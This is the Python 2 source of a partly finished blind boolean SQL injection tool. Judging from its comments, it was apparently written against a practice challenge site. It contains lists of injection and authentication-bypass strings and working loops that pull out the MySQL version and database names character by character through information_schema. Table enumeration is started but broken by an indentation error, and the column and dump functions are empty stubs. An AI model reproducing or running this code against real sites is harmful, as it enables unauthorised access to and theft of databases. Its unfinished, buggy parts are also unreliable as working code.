#!/usr/bin/python2
# -*- coding: utf-8 -*-

import re
import os
import string
import sys, getopt
import urllib2, requests
from optparse import OptionParser

# --------- Global variables ----------
#global l_database_name = []
l_injnum        = ["'", "1+1", "3-1", "1 or 1 = 1", "1) or (1 = 1", "1 and 1 = 2", "1) and (1 = 2",
                    "1 or 'ab' = 'a' + 'b'", "1 or 'ab' = 'a''b", "1 or 'ab'='a'||'b'", "' and 'x' = 'p'#"]
l_bypass        = ["admin'--", "admin'#", "1--", "1 or 1 = 1--", "' or '1'='1'--", "-1 and 1=2",
                    "' and '1'='2'--", "1/* comment */"]
l_bypass2       = ["admin')--", "admin')#", "1)--", "1) or 1 = 1--", "') or '1'='1'--", "-1) and 1=2",
                    "') and '1'='2'--"]
#alphabet        = "abcdefghijklmnopqrstuvwxyz"
dump            = {'database2':{'table'}, 'information_schema':{'table1':['colo1','colo2'], 'table2':['colo1']}}

# --------- Main function option parsing ----------
def main():
    arg_help = """Blind SQLi:
python sql.py TODO include args
python sql.py TODO include args"""

    parser = OptionParser(usage=arg_help)
    try:
        parser.add_option("-u", "--url", action="store", type=str, dest="URL", help="The target url to inject")
        parser.add_option("-p", "--payload", action="store", type=str, dest="PAYLOAD", help="The payload used to trigger the injection")
        parser.add_option("-b", "--bypass", action="store", type=str, dest="BYPASS", help="The bypass used the injection")
        parser.add_option("-e", "--enum", action="store_true", dest="ENUM", help="Enumerate databases, tables columns")
        parser.add_option("-D", "--dump", action="store_true", dest="DUMP", help="Dump the chosen database")
        parser.add_option("-d", "--database", action="store", type=str, dest="DATABASE", help="The database to dump")
    except optparse.AmbiguousOptionError as ambiguous:
        print("Ambiguous option: " + ambiguous)
    except optparse.BadOptionError as bad_option:
        print("Bad option: " + bad_option)

    # Affect options argument to variables
    (options, args) = parser.parse_args()

    url                 = options.URL
    payload             = options.PAYLOAD
    bypass              = options.BYPASS
    enum                = options.ENUM
    dump                = options.DUMP
    database            = options.DATABASE

    global session
    with requests.session() as session:
        # TODO algo principal ici
        # Enumerer le nombre de colonnes de la table courante pour l'injection
        # Trouver la version du serveur SQL
        sql_version(url,payload, bypass)
        eunum_databases(url, payload, bypass)
        # Récupérer la base de données courantes et les autres bases de données
        # Pour chaque base database
            # Récupérer les tables
            # Pour chaque table
                # Récupérer le nombre de colonnes

# --------- Find SQL database version ----------
def sql_version(url, payload, bypass):
    '''
        Request working on leettime
        Is the base request for finding the database version number
        uri = url + "' and "  + "substring(@@version,1,1)>=" + str(i) + " or '"
    '''
    server_version = 0
    for sql_version in range(4,7):
        uri = url + str(payload)  + "substring(@@version,1,1)>=" + str(sql_version) + str(bypass)
        server_response = request_handler(uri)
        server_response_status = validate_request(server_response)

        if server_response_status is False:
            server_version = sql_version - 1

            if server_version == 4:
                print "SQL version 4 detected... Not yet supported!"
                sys.exit()

    return server_version

# --------- Enumerate databases ----------
def eunum_databases(url, payload, bypass):
    '''
        Request working on leettime
        Is the base request for finding the number of databases, how many characters are in each database name
        ' and substring((select schema_name from information_schema.schemata limit 0,1),1,1)>=0 or '

        TODO
            Handle the case where database increment starts at 1 so first test will be false, second true, n true, o false...
        TODO
    '''

    database_increment = 0

    # Count how many databases, we assume there are less than 64 databases
    while (database_increment < 64):
        # uri = url + "' and substring((select schema_name from information_schema.schemata limit " + str(database_increment) + ",1),1,1)>=0" + bypass
        uri = url + str(payload) + "substring((select schema_name from information_schema.schemata limit " + str(database_increment) + ",1),1,1)>=0" + bypass
        # print str(uri)
        # server_response = request_handler(uri)
        try:
            server_response = session.get(uri).content
        except requests.exceptions.RequestException as e:
            print e
            database_increment -= 1
            continue

        server_response_status = validate_request(server_response)

        # If status is false then we know the number of databases
        if server_response_status is False:
            print 'Found ' + str(database_increment) + ' Databases'

            # Count how many letters in each database name
            for database_number in range(0,database_increment):
                database_letter_count = 1

                # Count how many chars in db name, we assume the database name to be less than 128 characters
                while (database_letter_count < 128):
                    # ' and (select length(schema_name) from information_schema.schemata limit 0,1)>=19 or '
                    uri = url + str(payload) + "(select length(schema_name) from information_schema.schemata limit " + str(database_number) + ",1)>=" + str(database_letter_count) + bypass
                    # server_response = request_handler(uri)
                    try:
                        server_response = session.get(uri).content
                    except requests.exceptions.RequestException as e:
                        print e
                        continue

                    server_response_status = validate_request(server_response)
                    # print server_response_status, database_letter_count

                    if server_response_status is False:
                        print 'Database ' + str(database_number) + ': has ' + str(database_letter_count - 1) + ' letters'
                        database_name = ""

                        # Get the databases names
                        for letter_count in range(1,database_letter_count):

                            # Loop in ascii range to guess each character
                            for database_letter in range(1,128):
                                uri = url + str(payload) + "ascii(substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1)," + str(letter_count) + ",1))>=" + str(database_letter) + bypass
                                # print str(uri)

                                # server_response = request_handler(uri)
                                try:
                                    server_response = session.get(uri).content
                                except requests.exceptions.RequestException as e:
                                    print e
                                    database_letter -= 1
                                    continue

                                server_response_status = validate_request(server_response)

                                # If status is false then database_letter - 1 was the n-th char of the database name
                                if server_response_status is False:
                                    database_name += str(chr(database_letter - 1))
                                    print "Database name: " + str(database_name)
                                    break

                        print database_name
                        dump[database_name] = {}
                        print dump

                        break

                    # elif server_response_status is True:
                    database_letter_count = database_letter_count + 1

        elif server_response_status is True:
            database_increment = database_increment + 1

# --------- Enumerate database tables ----------
def enum_tables(url, payload, bypass, database):
        '''
            Request working on leettime
            Is the base request for finding the number of databases, how many characters are in each database name
            ' and substring((select table_name from information_schema.tables where table_schema != 'mysql' and table_schema != 'information_schema' limit 0,1),1,1)>=0 or '

            TODO
                Handle the case where database increment starts at 1 so first test will be false, second true, n true, o false...
            TODO
        '''

       for database in dump.keys():
            print database

            table_increment = 0

            # Count how many databases, we assume there are less than 64 tables
            while (table_increment < 64):
                uri = url + str(payload) + "substring((select table_name from information_schema.tables where table_schema = '" + database + "' limit " + str(table_increment) + ",1),1,1)>=0" + bypass
                server_response = request_handler(uri)
                server_response_status = validate_request(server_response)

                # If status is false then we know the number of table
                if server_response_status is False:
                    print 'Found ' + str(table_increment) + ' Tables in database ' + database

                    # Count how many letters in each table name
                    for table_number in range(0,table_increment):

                        table_letter_count = 1

                        # Count how many chars in table name, we assume the database name to be less than 128 characters
                        while (table_letter_count < 128):
                            uri = url + str(payload) + "substring((select length(table_name) from information_schema.tables where table_schema = '" + database + "' limit " + str(table_number) + ",1),"+ str(table_letter_count) + ",1)>=0" + bypass
                            server_response = request_handler(uri)
                            server_response_status = validate_request(server_response)

                            if server_response_status is False:
                                print 'Table ' + str(table_number) + ': has ' + str(table_letter_count) + ' letters'
                                table_name = ""

                                # Get the databases names
                                for table_letter_count in range(1,table_letter_count):

                                    # Loop in ascii range to guess each character
                                    for table_letter in range(1,128):
                                        uri = url + str(payload) + "ascii(substring((select table_name from information_schema.tables where table_schema = '" + database + "' limit " + str(table_number) + ",1)," + str(table_letter_count) + ",1))>=" + str(table_letter) + bypass
                                        server_response = request_handler(uri)
                                        server_response_status = validate_request(server_response)

                                        # If status is false then database_letter - 1 was the n-th char of the database name
                                        if server_response_status is False:
                                            table_name = table_name + str(chr(table_letter - 1))
                                            print "Table name :" + str(database_name)
                                            break

                            # elif server_response_status is True:
                            table_letter_count = table_letter_count + 1

                        print table_name
                        dump[database][table_name] += []

                elif server_response_status is True:
                    table_increment = table_increment + 1

            print dump

# --------- Find the numer of columns ----------
def enum_columns(url, payload, bypass, database, table):
    pass

# --------- Dump the database ----------
def exfiltrate_data(url, payload, bypass, database):
    pass

# --------- Forge & send HTTP requests ----------
def request_handler(url):
# Create session if it doesn't exist
    # if not session:
    #     session = requests.session()
    page = session.get(url)

    # with requests.session() as session:
    #     page = session.get(url)
    return page.content

# --------- Confirm that request was executed ----------
def validate_request(page):
    if re.search('Your are welcome', page):
        return True
    if re.search('Get lost',page):
        return False
    if page == "":
        print "Error: request returned empty page!"

# --------- Display -----------------------------------
def display_database_struct(dump):
    for database, table_dictionnary in dump.iteritems():
        print "Database: " + str(database)

        for table, column_list in table_dictionnary.iteritems():
            print "Table: " + str(table)

            for column in column_list:
                print column

def display_database_dump(dump):
    for database, table_dictionnary in dump.iteritems():
        print "Database: " + str(database)

        for table, column_list in table_dictionnary.iteritems():
            print "Table: " + str(table)

            for column in column_list:
                print column

if __name__ == "__main__":
    main()
